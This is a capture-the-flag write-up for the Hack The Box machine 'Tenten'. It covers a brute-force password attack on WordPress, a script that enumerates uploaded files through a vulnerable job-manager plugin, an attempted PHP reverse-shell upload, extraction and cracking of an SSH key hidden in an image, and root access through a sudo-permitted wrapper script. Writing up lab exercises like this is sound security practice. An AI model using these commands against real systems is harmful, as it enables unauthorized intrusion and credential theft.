---
created: 2025-07-28
---

📅 `2025-07-28`

#wordpress #steganography #sudo

----

## 🖥️ Box Info

| ️🏷️ Name       | `Tenten`      |
| --------------- | ------------- |
| 📆 Release Date | `2017-03-22`  |
| 🌐 IP Address   | `10.10.10.10` |
| 🖥️ OS          | `Linux`       |
| 🎯 Difficulty   | `Medium`      |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `WordPress` vulnerable plugin
- Steganography
- Brute force the `SSH` key's passphrase
- `sudo` `bash` script

**🛠️ Tools:**  

- `wpscan`
- `steghide`
- `john`

**📚 Learned:**  

- Find embedded files in `.jpg` images with `steghide`.
- Always enumerate `sudo` permissions with `sudo -l`.

----

## 🌐 Port Scan

- **TCP**: 22, 80
- **UDP**: None

---

## 🔍 Enumeration

#### Known Vulnerabilities

`http://10.10.10.10` redirects to `http://tenten.htb`, so I added `tenten.htb` to `/etc/hosts`. The website is a blog made with `WordPress`.

![[Pasted image 20250725165050.png#border]]

`ffuf` only found `/wp-content`, `/wp-admin`, and `wp-includes`. No virtual hosts found.

Going to the only post on the blog I found user `takis`. Let's use `wpscan` to brute-force passwords, since it will discover users automatically first:

```shell
wpscan --url 'http://tenten.htb' --password-attack xmlrpc -t 20 -P $ROCKYOU --api-token <token>

[i] User(s) Identified:

[+] takis
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://tenten.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
```

The tool found only user `takis`, which we found earlier. I left this running in the background and scan for vulnerable plugins and vulnerabilities on `WordPress` itself.

```shell
wpscan --url 'http://tenten.htb' vp --api-token <token>
```

The tool found that the version of `WordPress` in use is version 4.7.3, which is old and has 88 vulnerabilities. It also found plugin `job-manager`, which has 2 vulnerabilities. I copied and pasted these 2 sections into files `wpscan_vulns.txt` and `wpscan_plugins.txt` to investigate.

I decided to try fuzzing for directories with the `common.txt` wordlist:

```shell
ffuf -u 'http://tenten.htb/FUZZ' -w $COMMON
```

And it gave me these results:

```shell
.cache
.hta
.bashrc
.htpasswd
.htaccess
.profile
index.php
server-status
wp-content
wp-admin
wp-includes
xmlrpc.php
```

This is the response after navigating to `/.bashrc`:

![[Pasted image 20250725173531.png#border]]

This suggested we might be reading files from a user's home folder.

>[!note]
>The brute-force attack we left earlier didn't find anything.

It turned out these 2 files (`.bashrc` and `.profile`) were simply in the web root: I couldn't find any other files.

#### Web App

I stopped looking for vulnerabilities like these and started exploring the web app. 

The post has this form for submitting a comment:

![[Pasted image 20250725185239.png#border]]

It has a "Jobs Listing" button that leads to this page:

![[Pasted image 20250725184825.png#border]]

After clicking "Apply Now" for the only job listing, I was redirected to this `URL`: `http://tenten.htb/index.php/jobs/apply/8/`, which looks like this:

![[Pasted image 20250725184910.png#border]]

Interesting features:

- The `8` at the end of the `URL` may be modifiable and show us more (`IDOR`).
- The form submission, which includes a file upload for a `CV` (command injection, file upload).
- The comment feature for posts (`XSS`).
- Since it appears `/index.php/` is a directory, I may be able to find more under `/index.php/`, `/index.php/jobs/` or `/index.php/jobs/apply/` by fuzzing directories.

I tested the first option:

```shell
seq 1 3000 | ffuf -u 'http://tenten.htb/index.php/jobs/apply/FUZZ/' -w - -fw 3631
```

And it gave me these valid IDs:

```
1
2
3
5
6
7
8
9
10
11
12
13
```

#### Plugin Vulnerability

I'll try the `IDOR` vulnerability in `job-manager`. I found this exploit: https://raw.githubusercontent.com/jimdiroffii/CVE-2015-6668/refs/heads/main/exploit.py. This short snippet isn't a working exploit, but it's a template that can be used to craft a working exploit for this bug.

```python
import requests

URL = "http://tenten.htb"
filename = "filename"

for year in range(2017, 2019):
    for i in range(1, 13):
        for extension in {"jpeg", "png", "jpg"}:
            endpoint = f"{URL}/wp-content/uploads/{year}/{i:02}/{filename}.{extension}"
            req = requests.get(endpoint)
            if req.status_code == 200:
                print("[+] URL of CV found! " + endpoint)
```

---

## 🪜 Foothold / User

Apparently, the plugin `job-manager` has a vulnerability that enables an attacker to gather the `URL`s of uploaded `CV` files of applicants, which is both a violation of privacy and a way of including the files in the web response, meaning that if I could upload a `.php` file, I could include it with this vulnerability and gain `RCE`.

I wrote a more complex `Python` script than the one above for exploiting this vulnerability. I uploaded `nyan.jpg` to job application number 13 and tested my exploit.

The exploit returned this `URL`: 

- `http://tenten.htb/wp-content/uploads/2025/07/nyan.jpg`

This means that whatever file I upload keeps its original name under the `07` directory. Next, I tried uploading a `PHP` reverse shell with the name `shell.php`.

![[Pasted image 20250725215451.png#border]]

And:

![[Pasted image 20250725215503.png#border]]

This time there's a filter. I tried bypasses with `BurpSuite`.

Nothing was working, but my exploit also found these 2 files:

- `http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg`
- `http://tenten.htb/wp-content/uploads/2017/04/cube.jpg`

With nothing left to try, I turned to steganography. I looked at individual color channels in Photoshop, increased contrast, used `strings`, `binwalk3`, `hexyl`, but only `steghide` found something:

```shell
steghide info HackerAccessGranted.jpg
"HackerAccessGranted.jpg":
  format: jpeg
  capacity: 15.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "id_rsa":
    size: 1.7 KB
    encrypted: rijndael-128, cbc
    compressed: yes
```

It had an `id_rsa` file embedded, so I didn't need to inspect `cube.jpg`. I changed the permissions with `chmod 600 ./id_rsa` and tried to log in as `takis`.

```shell
ssh takis@tenten.htb -i ./id_rsa
Enter passphrase for key './id_rsa':
```

The key had a passphrase, so I cracked it.

```shell
ssh2john ./id_rsa > hash.txt

john --wordlist=$ROCKYOU ./hash.txt

<SNIP>
superpassword    (id_rsa)
<SNIP>
```

That was quick. The password for the `SSH` key is `superpassword`. Now we can log in.

```shell
ssh takis@tenten.htb -i ./id_rsa
Enter passphrase for key './id_rsa': superpassword

takis@tenten:~$ ls
user.txt
```

And we're in as user `takis`.

---

## 🛡️ Privilege Escalation

Let's enumerate `sudo`:

```shell
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```

We have `sudo` permissions for `/bin/fuckin`.

```shell
takis@tenten:~$ file /bin/fuckin
/bin/fuckin: Bourne-Again shell script, ASCII text executable

takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
```

Looks like a `bash` script that will execute positional arguments. This means we can pass `bash` as an argument to get a root shell.

```shell
takis@tenten:~$ sudo /bin/fuckin bash

root@tenten:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted.